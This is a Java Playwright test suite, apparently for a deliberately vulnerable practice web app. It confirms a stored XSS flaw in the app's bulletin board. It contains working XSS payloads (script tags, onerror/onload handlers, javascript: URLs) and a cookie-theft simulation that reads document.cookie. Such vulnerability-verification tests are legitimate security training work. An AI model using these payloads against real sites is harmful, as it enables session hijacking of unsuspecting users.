package com.vulsite.vulnerability;

import com.microsoft.playwright.*;
import com.vulsite.entity.User;
import com.vulsite.repository.BoardRepository;
import com.vulsite.repository.UserRepository;
import org.junit.jupiter.api.*;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.web.server.LocalServerPort;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * A담당 - 취약점 #2: Stored XSS 테스트 (Playwright 브라우저 테스트)
 *
 * 테스트 시나리오:
 * 1. XSS 페이로드가 포함된 게시글 작성
 * 2. 다른 사용자가 게시글 조회 시 스크립트 실행 확인
 * 3. 다양한 XSS 페이로드 테스트
 *
 * 참고: 이 테스트는 실제 브라우저를 사용하므로 서버가 실행 중이어야 합니다.
 */
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
@Tag("vuln")
class StoredXssTest {

    @LocalServerPort
    private int port;

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private BoardRepository boardRepository;

    private static Playwright playwright;
    private static Browser browser;
    private BrowserContext context;
    private Page page;

    private String baseUrl;

    @BeforeAll
    static void setUpBrowser() {
        playwright = Playwright.create();
        // Mac/Windows/Linux 모두 지원, headless 모드로 실행
        browser = playwright.chromium().launch(new BrowserType.LaunchOptions()
                .setHeadless(true));  // CI 환경에서는 true, 디버깅 시 false
    }

    @AfterAll
    static void tearDownBrowser() {
        if (browser != null) browser.close();
        if (playwright != null) playwright.close();
    }

    @BeforeEach
    void setUp() {
        baseUrl = "http://localhost:" + port;
        context = browser.newContext();
        page = context.newPage();

        // 테스트 사용자 생성
        if (userRepository.findByUsername("xsstest").isEmpty()) {
            User xssUser = new User("xsstest", "xsspass", "xss@test.com", "XSS테스터");
            userRepository.save(xssUser);
        }
    }

    @AfterEach
    void tearDown() {
        if (context != null) context.close();
    }

    private void login(String username, String password) {
        page.navigate(baseUrl + "/user/login");
        page.fill("input[name=username]", username);
        page.fill("input[name=password]", password);
        page.click("button[type=submit]");
        page.waitForURL(url -> !url.contains("/login"));
    }

    @Test
    @DisplayName("[정상] 일반 텍스트 게시글 작성 및 조회")
    void writeNormalPost_shouldDisplayCorrectly() {
        login("xsstest", "xsspass");

        // 게시글 작성
        page.navigate(baseUrl + "/board/write");
        page.fill("input[name=title]", "일반 게시글");
        page.fill("textarea[name=content]", "이것은 일반 텍스트입니다.");
        page.click("button[type=submit]");

        // 게시글 목록에서 확인
        page.navigate(baseUrl + "/board");
        assertThat(page.content()).contains("일반 게시글");

        System.out.println("[정상 테스트] 일반 게시글 작성 및 조회 성공");
    }

    @Test
    @DisplayName("[취약점 #2] Stored XSS - script 태그 삽입")
    void storedXss_withScriptTag_shouldExecute() {
        login("xsstest", "xsspass");

        String xssPayload = "<script>window.xssExecuted=true;</script>";

        // XSS 페이로드가 포함된 게시글 작성
        page.navigate(baseUrl + "/board/write");
        page.fill("input[name=title]", "XSS 테스트 글");
        page.fill("textarea[name=content]", "내용입니다. " + xssPayload);
        page.click("button[type=submit]");

        // 게시글 상세 페이지로 이동
        page.navigate(baseUrl + "/board");
        page.click("text=XSS 테스트 글");

        page.waitForFunction("() => window.xssExecuted === true");

        // JavaScript가 실행되었는지 확인
        Object result = page.evaluate("() => window.xssExecuted === true");
        assertThat(result).isEqualTo(true);

        System.out.println("[취약점 확인] Stored XSS - script 태그 실행 성공");
    }

    @Test
    @DisplayName("[취약점 #2] Stored XSS - img onerror 이벤트")
    void storedXss_withImgOnerror_shouldExecute() {
        login("xsstest", "xsspass");

        String xssPayload = "<img src='x' onerror='window.imgXssExecuted=true'>";

        // XSS 페이로드가 포함된 게시글 작성
        page.navigate(baseUrl + "/board/write");
        page.fill("input[name=title]", "IMG XSS 테스트");
        page.fill("textarea[name=content]", xssPayload);
        page.click("button[type=submit]");

        // 게시글 상세 페이지로 이동
        page.navigate(baseUrl + "/board");
        page.click("text=IMG XSS 테스트");

        page.waitForFunction("() => window.imgXssExecuted === true");

        // JavaScript가 실행되었는지 확인
        Object result = page.evaluate("() => window.imgXssExecuted === true");
        assertThat(result).isEqualTo(true);

        System.out.println("[취약점 확인] Stored XSS - img onerror 실행 성공");
    }

    @Test
    @DisplayName("[취약점 #2] Stored XSS - 다양한 페이로드 테스트")
    void storedXss_withVariousPayloads_shouldExecute() {
        login("xsstest", "xsspass");

        String[][] payloads = {
            {"svg onload", "<svg onload='window.svgXss=true'>"},
            {"body onload", "<body onload='window.bodyXss=true'>"},
            {"iframe src", "<iframe src='javascript:parent.window.iframeXss=true'>"},
            {"a href javascript", "<a href='javascript:window.aXss=true' id='xsslink'>클릭</a>"}
        };

        for (String[] payload : payloads) {
            String name = payload[0];
            String xss = payload[1];

            page.navigate(baseUrl + "/board/write");
            page.fill("input[name=title]", "XSS: " + name);
            page.fill("textarea[name=content]", xss);
            page.click("button[type=submit]");

            System.out.println("[페이로드 테스트] " + name + " 게시글 작성 완료");
        }

        // 각 게시글 조회하며 확인
        page.navigate(baseUrl + "/board");
        assertThat(page.content()).contains("XSS: svg onload");

        System.out.println("[취약점 확인] 다양한 XSS 페이로드 저장 성공");
    }

    @Test
    @DisplayName("[취약점 #2] Stored XSS - 제목에도 XSS 삽입")
    void storedXss_inTitle_shouldExecute() {
        login("xsstest", "xsspass");

        String xssTitle = "<script>window.titleXss=true</script>제목";

        // 제목에 XSS 삽입
        page.navigate(baseUrl + "/board/write");
        page.fill("input[name=title]", xssTitle);
        page.fill("textarea[name=content]", "내용");
        page.click("button[type=submit]");

        // 목록 페이지에서 스크립트 실행 확인
        page.navigate(baseUrl + "/board");

        Object result = page.evaluate("() => window.titleXss === true");

        if (Boolean.TRUE.equals(result)) {
            System.out.println("[취약점 확인] 제목에서도 XSS 실행됨");
        } else {
            System.out.println("[정보] 제목에서는 XSS가 실행되지 않음 (th:text 사용 가능성)");
        }
    }

    @Test
    @DisplayName("[취약점 #2] Stored XSS - 쿠키 탈취 시뮬레이션")
    void storedXss_cookieTheft_simulation() {
        login("xsstest", "xsspass");

        // 실제 공격에서는 외부 서버로 쿠키를 전송
        // 여기서는 로컬 변수에 저장하는 것으로 시뮬레이션
        String xssPayload = "<script>window.stolenCookie=document.cookie;</script>";

        page.navigate(baseUrl + "/board/write");
        page.fill("input[name=title]", "쿠키 탈취 테스트");
        page.fill("textarea[name=content]", xssPayload);
        page.click("button[type=submit]");

        page.navigate(baseUrl + "/board");
        page.click("text=쿠키 탈취 테스트");

        Object stolenCookie = page.evaluate("() => window.stolenCookie");

        System.out.println("[취약점 확인] XSS로 탈취 가능한 쿠키: " + stolenCookie);
        assertThat(stolenCookie).isNotNull();
    }
}
